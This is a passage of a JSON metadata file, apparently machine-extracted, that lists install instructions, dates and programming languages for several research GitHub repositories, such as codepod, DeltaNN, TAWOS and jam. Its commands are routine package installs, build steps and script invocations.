                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "It requires a trained classifier. For example, if the classifier trained with `<filter> = 20` and `<layers> = 4` is available, then the hill climbing approaches can be applied.\n```commandline\npython -m indago.experiments --algo <algo-name> \\\n\t--exp-id <exp-id> --env-name <env-name> --env-id <env-id> \\\n\t--avf-test-policy <ga-policy> --failure-prob-dist \\\n\t--num-episodes <num-episodes> \\\n\t--num-runs-each-env-config <num-runs> \\\n\t--training-progress-filter <filter> \\\n\t--layers <layers> \\\n\t--population-size <population-size> \\\n\t--crossover-rate <crossover-rate> \\\n\t--budget <budget> \\\n\t--num-runs-experiments <num-runs-experiments> \\\n\t[--regression] \\\n\t[--minimize]\n```\n \n",
                    "original_header": "4.1.4 Genetic Algorithms Methods"
                },
                "confidence": 0.9989680807669057,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Type:\n```commandline\npython -m indago.env_logs_analysis_trials \\\n\t--folder <folder-name> \\\n\t--env-name <env-name> \n\t--names <[list-of-names]>\n```\n \n",
                    "original_header": "5.1 Analyze Failure Search Results"
                },
                "confidence": 0.998194831270154,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Type:\n```commandline\npython -m indago.experiments --algo <algo-name> \\\n\t--exp-id <exp-id> --env-name <env-name> --env-id <env-id> \\\n\t--avf-test-policy replay_test_failure --failure-prob-dist \\\n\t--exp-file <exp-file>\n```\n \n`<exp-file>` is a log file starting with `testing-*-trial.txt` in the logs folder. The command will parse the file to look for environment configurations that caused a failure at testing time and replay those configurations (`replay_test_failure`). \nAfterwards, diversity can be computed by typing:\n```commandline\npython -m indago.diversity \\\n\t--folder <folder-name> \\\n\t--env-name <env-name> \\\n\t--pattern \n\t--names <[list-of-names]>  \\\n\t--type <type> \\\n\t--sil-threshold 20 \\\n\t--visualize\n```\n \n",
                    "original_header": "5.2 Analyze Diversity Results"
                },
                "confidence": 0.9831108979490288,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-26T04:37:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T06:39:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 763976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2610
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1268
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "483": {
        "filename": "codepod-io_codepod_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/codepod-io/codepod",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can [use CodePod online](https://app.codepod.io) without installing it\nlocally. To install it on your computer:\n\nStep 1: install prerequisite: [nodejs](https://nodejs.org/en/download) runtime\nand python & ipykernel:\n\n```\nbrew install node # example for MacOS\npip3 install ipykernel\n```\n\nStep 2: Install codepod CLI app from [npm registry](https://www.npmjs.com/package/codepod):\n\n```\n> npm install -g codepod\n> codepod --version\n# 0.0.7\n```\n\nStep 3: launch CodePod from terminal:\n\n```\n> codepod /path/to/local/repo\n# ... \ud83d\ude80 Server ready at http://localhost:4001\n```\n\nOpen this URL in your browser to see the app. The files will be saved to the\ndirectory `/path/to/repo/codepod.bin|json`. The `codepod.bin` is the source of\ntruth, and `codepod.json` is for human-readability only.\n\nIn the future, you can update the app:\n\n```\n> npm update -g codepod\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/codepod-io/codepod/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Open two terminals. On one:\n```\ncd apps/api\npnpm dev\n```\nOn the other:\n```\ncd apps/ui\npnpm dev\n```\n \nNow go to `http://localhost:3000` to see the app.\n \n",
                    "original_header": "Develop"
                },
                "confidence": 0.9806399009395269,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codepod-io/codepod/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-04T15:55:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-04T18:39:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 398171
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 81484
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 17602
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 5300
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 640
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 619
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 484
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "484": {
        "filename": "luludak_DeltaNN_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/luludak/DeltaNN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The system needs TVM to be installed.\nWe also use `Python v3.8.5` and `Pip` as the package installer.\n\nIn addition, the system requires a number of pip packages, which you can find in the requirements.txt file.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "DeltaNN"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/luludak/DeltaNN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Install Python and Pip on your system.\n- Python comes with linux distros usually, but this is not always the case for Pip. You can install it by running `sudo apt install python3-pip`.\n2. Download and install TVM:\nFor instructions of how to install TVM, please refer to the [TVM related guide for developers](https://tvm.apache.org/docs/install/from_source.html#developers-get-source-from-github).\nFollow the installation from source instructions, and consider enabling the LLVM and the OPENCL flags. \n3. Install necessary packages by executing the command:\n`pip3 install -r requirements.txt` \n4. Download necessary TF/TFLite models, if you wish to run them.\nAlthough system utilizes already provided models for Keras and PyTorch, we utilized some TF/TFlite models from the GitHub repo of Tensorflow for slim Models. These are:\n- `MobileNetV2`\n- `ResNet101`\n- `InceptionV3` \n",
                    "original_header": "Instructions:"
                },
                "confidence": 0.9999999907585985,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luludak/DeltaNN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The configuration of the system is included into the config.json file.\nEach section is self-explanatory and defines which part it concerns.\nImportant notes:\n- You can run the models **without** TVM, directly using the library of your choice. In this case, set the flag `backend` to `libraries` instead of `tvm`.\n- You can utilize the TVM debugger, by setting `debug_enabled: true`.\n- `build` and `execute` flags concerns the ONNX model defined in the URL and will apply actions only to this. If you want DLLs to be built or executed, mark flag `build_dlls` or `execute_dlls` as true.\n- `evaluate` flag concerns DLLs as well.\n- Device settings have been cleared out to preserve anonymity. If you wish, you can set up your own TVM RPC server on your own device and run everything following the instructions [here](\nhttps://tvm.apache.org/docs/tutorial/cross_compilation_and_rpc.html).\n \n",
                    "original_header": "Configuration"
                },
                "confidence": 0.9998508417526493,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luludak/DeltaNN/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-24T16:48:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-25T16:30:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 125245
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "485": {
        "filename": "SOLAR-group_TAWOS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SOLAR-group/TAWOS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The dataset is stored as a relational database, dumped from MySQL v. 8.0.22.\n\nTo start using the dataset, follow these instructions:\n\n**Step 1:** [Install MySQL](https://dev.mysql.com/doc/refman/8.0/en/installing.html) database management system.\n\n**Step 2:** Download and unzip the dataset (.sql file) from [10.5522/04/21308124](http://doi.org/10.5522/04/21308124).\n\n**Step 3:** Setup the database using the downloaded file:\n\n`> mysql -u [user] -p [database_name] < [filename].sql` \n\nIf you are interested in a graphical user interface, you can also install [MySQL Workbench](https://www.mysql.com/products/workbench/).\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation Instructions",
                    "parent_header": [
                        "The TAWOS Dataset (V. 1.1)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SOLAR-group/TAWOS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-28T10:14:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-30T10:20:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "486": {
        "filename": "Sissel-Wu_Bee_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Sissel-Wu/Bee",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-12T06:25:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-04T20:51:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 275498
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "487": {
        "filename": "HadiJahanshahi_ADPTriage_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HadiJahanshahi/ADPTriage",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-07-07T20:55:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-09T21:12:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 236954
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 11904
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "488": {
        "filename": "JetBrains-Research_RefactorInsight_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JetBrains-Research/RefactorInsight",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\".github/readme/refactorinsight_toggle_in_diff.png\" alt=\"Code Diff\" width=\"600\"> \n",
                    "original_header": "Smart diff"
                },
                "confidence": 0.9265403371632743,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/RefactorInsight/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To see refactorings in your Git repository, go to the **Git/Log** tab in IntelliJ IDEA and choose `Refactorings` in the drop-down list next to `Show`. \n",
                    "original_header": "Refactorings in commits"
                },
                "confidence": 0.9994117122584781,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/RefactorInsight/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To see the refactorings in a specific pull request, go to the **Pull Requests** tab in IntelliJ IDEA, select any pull request and click ![](.github/readme/refactorinsight_toggle.svg). \n",
                    "original_header": "Refactorings in pull requests"
                },
                "confidence": 0.9995345179209059,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/RefactorInsight/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Available ```Run configurations``` could be found in BASH7*:\n* BASH8* \u2014 builds the plugin;\n* BASH9* \u2014 runs an IDE instance with pre-installed plugin.\n \n",
                    "original_header": "Build instructions"
                },
                "confidence": 0.999594777636543,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/RefactorInsight/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You are welcome to submit a bug report or suggest a feature: [open an issue](https://github.com/JetBrains-Research/refactorinsight/issues). \nPull requests are also welcome and encouraged. \n",
                    "original_header": "Contribution and feedback"
                },
                "confidence": 0.99569731296435,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JetBrains-Research/RefactorInsight/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-06-30T10:05:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T09:50:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 554804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 31866
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 6654
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 1715
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "489": {
        "filename": "apcl-research_jam_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/apcl-research/jam",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We release our test set as a ``.tar.gz`` file in [apcl/funcom-java-long](https://huggingface.co/datasets/apcl/funcom-java-long/tree/main) repository. You can simiply run the following command to download and extract test set for inference.\n```\npython3 download_extract_file.py \n```\n    --repo_id: the id of repository that you want to download files\n    --local_dir: directory that you want to put your files\n    --filename: name of the file that you want to download\nWe have already set the default parameters to the required parameters for downloading test set. If you just want to download and extract test set, you only need to run the command above.\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Download test set and extract it",
                    "parent_header": [
                        "Jam: A Language Model of Java Methods",
                        "Dataset Deduplication"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To set up your local environment, run the following command. We recommend the use of a virtual environment for running the experiements.\n```\npip install -r requirements.txt\n``` \n- **If you only want to finetune one of our pre-trained models**, please see [Pre-trained Model Checkpoints](#model), [Fine-tuning](#fine-tuning), and [Inference](#inference). Additionally recommend using [Deduplication toolkit](#dataset-deduplication) before inference on your own test set.\n- If you only want to deduplicate your dataset, refer to subsection 6.3, please see [Deduplication toolkit](#dataset-deduplication).\n- If you want to re-train a model using our processed and tokenized dataset, please see [Retraining](#re-training)\n- if you want to scratch-train, by reprocessing the dataset, pleasde see [Entire process](#entire-process) and [Re-Training](#re-Training) \n",
                    "original_header": "To-do list"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "These steps will show you how to fine-tune for the code summarization application from our paper.  You can hack these scripts to do whatever you need for your own task.\n \n",
                    "original_header": "Fine-tuning"
                },
                "confidence": 0.9646644771225177,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\npython3 train.py config/finetune_funcom.py\n```\nNote that you need to change the ``out_dir`` in the finetune_funcom.py to the same ``dir`` as your ``--local_dir``.\n \n",
                    "original_header": "Step 2: Fine-tune model"
                },
                "confidence": 0.9980140964201666,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After you download and deduplicate the test set, you can simiply run command below for inference.\n```\npython sample_funcom.py --out_dir=outdir\n```\n    --outdir: directory of the model that you want to use for inference\n \n",
                    "original_header": "Inference"
                },
                "confidence": 0.9937822572974626,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We release two datasets that we use to pre-train our models. You can use the scripts that we provide to download these datasets automatically. \nTo download the required datasets automatically, you can run the following command. \n```\npython3 download.py --repo_id=apcl/jm52m  --local_dir=./data/yourdir --repo_type=dataset\n```\n \nThis will download the all the files in the repository. If you only want to download specific files, you can simply run the following command.  **Note:** The above command will download the entire dataset including the deduplication files (total 200gb+).  If you just want the raw data, use the --filename parameter like in the next command.  Specific files you might want for the raw data are ``fundats-j1.json.gz`` and ``jm52m.sql.gz``.  Or you may wish to retrain your own Jam models using our processed and tokenized data in ``train.bin`` and ``val.bin``. \n  ```\n  python3 download.py --repo_id=apcl/jm52m --filename=file.pkl --local_dir=./data/yourdir --repo_type=dataset\n  ```\n    --repo_id: either apcl/jm52m or apcl/so13m; apcl/jm52m is for 52 million Java methods and apcl/so13m is for 13 million stackoverflow posts.\n    --filename: the name of the file that you want to download\n    --local_dir: the name of the directory that you want to put your files\n    --repo_type: the type of repo that you download the file; set to dataset if you donwload files from dataset repo \nAgain, you only need ``train.bin`` and ``val.bin`` if you only want to build your Jam models from scratch instead of going through the entire process. You can see more details on [Re-Training](#re-training). However, if you want to go through the entire process, you can check [Entire process](#entire-process) section.\n \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9936819145245851,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To generate 52 millions funcom Java methods, run the following command.\n  ```\n  python3 data/jam_jm52m/prepare_fc_raw.py --num-proc=4 --q90testfids-file=q90testfids.pkl --fundats-file=fundats-j1.pkl\n  ```\n    --num-proc: number of workers in .map() call\n    --q90testfids-file: funcom Java methods test set ID files\n    --fundats-file: Name of Java methods raw code files; It's a dictionary file with key = function id and values = raw code\n  \n  You will need to download q90testfids.pkl for Java methods' ID on test set and fundats-j1.pkl as Java methods' raw code. You can download these two files in [apcl/jm52m](https://huggingface.co/datasets/apcl/jm52m) repository. You may want to refer to [Dataset](#dataset) section to see how to download these files with the script that we release. \nYou can run the following command to generate 13 millions Stackoverflow posts data.\n  ```\n  python3 data/jam_so13m/prepare_stackoverflow.py --num-proc=4 --stackoverflow_filename=jam_so13m.pkl\n  ```\n    --stackoverflow_filename: Name of file for stackoverflow data; This is a dictionary file with key = post id and values = post text\nAfter the script is done, it will have both ``train.bin`` and ``val.bin`` in either ``data/jam_jm52m`` or ``data/jam_so13m`` directory. Be sure to move it to the same directory as ``train.py``.\n \n",
                    "original_header": "Step1: Dataset generation"
                },
                "confidence": 0.9830512014442156,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to train your own models from scratch and you only have one gpu, use the following command to train the model. \n  ```\n  python3 train.py config/{train_funcom_raw | train_stackoverflow}.py\n  ```\n    train_funcom_raw: traninig with 52 millions funcom Java methods \n",
                    "original_header": "Step 2: Train models"
                },
                "confidence": 0.999923991706106,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/apcl-research/jam/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-08T22:04:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-08T16:39:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 73961
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 14578
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "490": {
        "filename": "mirror-data_mirror_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mirror-data/mirror",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<h1 align=\"center\"><a href=\"https://mirror-data.github.io/\">\ud83e\ude9e Mirror </a> </h1>\n<p align=\"center\"><a href=\"https://arxiv.org/abs/2303.08697\">[\ud83d\udcc4 Paper]</a> | <a href=\"https://mirror-data.github.io/\">[\ud83c\udfe0 Website]</a> </p>\n<hr> \n"
                },
                "confidence": 0.9995116412251678,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- React\n- Matine.dev\n- Vega \nTo set up a development environment, you will need the following: \n",
                    "original_header": "Dependencies"
                },
                "confidence": 0.9686010329451742,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Node.js version 16 or higher\n- Yarn as the package manager \n"
                },
                "confidence": 0.9999910216148931,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Follow these steps to run the code locally: \n1. Set environment variables \n   ```\n   # .env.local\n   \n   # Your OpenAI API key\n   OPENAI_API_KEY={{REPLACE_IT_WITH_YOUR_OPENAI_API_KEY}}\n   \n   # Your Postgres URL, e.g. postgres://user:password@localhost:5432/dbname\n   PG_URL=\"{{REPLACE_IT_WITH_YOUR_POSTGRES_URL}}\"\n   \n   # Enable basic auth\n   # BASIC_AUTH={username}:{password}\n   ``` \n2. Install the dependencies with `yarn install` \n3. Run `yarn dev` to start the development server \n",
                    "original_header": "Running the Code"
                },
                "confidence": 0.9814238700787481,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To deploy Mirror, follow these steps: \n1. Build the web static server \n   ```\n   yarn build & yarn export\n   ``` \n",
                    "original_header": "Deployment"
                },
                "confidence": 0.9931595364315756,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "   ```\n   # Build Docker image\n   docker build -t mirror-data/mirror .\n   \n   # Multi-arch build\n   docker buildx build --platform linux/amd64,linux/arm64 -t mirror-data/mirror .\n   ``` \nPlease cite the repo if you use the code in this repo. \n"
                },
                "confidence": 0.9825659102569196,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mirror-data/mirror/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-21T04:40:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-22T10:35:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 44238
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1868
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 508
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 122
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "491": {
        "filename": "huiAlex_TAROT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/huiAlex/TAROT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Step1: Run `experiment.preprocess.parsecode.ParseCodeAST` to extract identifier names from source code, and `experiment.preprocess.biterm.ExtractReqBiterm` to extract initial biterms from code.\n* Step2: Run method`extractIssueBiterm()` and `extractUcBiterm()` in `experiment.preprocess.biterm.ExtractReqBiterm` to extract initial biterms from issue and uc respectively.\n* Step3: Run `experiment.preprocess.biterm.ConsensualBiterm` to get consensual biterms both shared by requirements and source code.\n \n",
                    "original_header": "Extract Consensual Biterms"
                },
                "confidence": 0.9841638218740522,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/huiAlex/TAROT/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-03T11:05:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-07T06:04:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 104949467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "492": {
        "filename": "gasevi_pyreclab_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gasevi/pyreclab",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n   Although *pyRecLab* can be compiled on most popular operating system, it has been tested on the following distributions. \n| Operating System | Version              |\n|:-----------------|:---------------------|\n| Ubuntu           | 16.04                |\n| CentOS           | 6.4                  |\n| Mac OS X         | 10.11 ( El Capitan ) |\n| Mac OS X         | 10.12 ( Sierra )     | \n",
                    "original_header": "<span style=\"font-size: 4em;\">Overview</span>"
                },
                "confidence": 0.9996757494678811,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "*pyRecLab* can be installed directly using pip as follow:\n \n",
                    "original_header": "<span style=\"font-size: 4em;\">Install</span>"
                },
                "confidence": 0.9999536732847614,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\npip install pyreclab\n```\n \n",
                    "original_header": "Python 2"
                },
                "confidence": 0.999992015105156,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
